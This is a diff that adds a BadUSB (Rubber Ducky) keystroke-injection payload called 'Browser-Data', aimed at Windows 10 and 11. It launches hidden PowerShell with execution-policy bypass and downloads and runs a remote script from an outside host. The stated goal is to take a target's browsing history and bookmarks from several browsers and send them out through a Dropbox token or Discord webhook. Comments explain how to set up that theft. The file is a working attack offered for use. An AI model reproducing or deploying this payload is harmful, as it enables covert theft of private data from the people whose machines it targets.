@@ -1,0 +1,19 @@
+REM     Title: Browser-Data
+
+REM     Author: Arpan Ghosh from I am Jakoby
+
+REM     Description: This payload will grab your targets brosing history and bookmarks from IE, Chrome, Firefox, and Opera GX.
+
+REM     Target: Windows 10, 11
+
+REM	Update the $db with the access token of Dropbox ( which has file write permission ); remember the file might be larger than 25 MB, so only Dropbox upload will work
+
+GUI r
+DELAY 500
+STRING cmd /c start /min "" powershell -w h -ep bypass -Command "$dc='';$db='';irm badusb.39039820.xyz/browserdata | iex"
+ENTER
+
+REM     Fill in either variable or both to set your exfil method.
+REM     $db is the variable that holds your DropBox token.
+REM     $dc is the variable that holds your Discord webhook.   
+REM     If you are using DropBox, also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly.
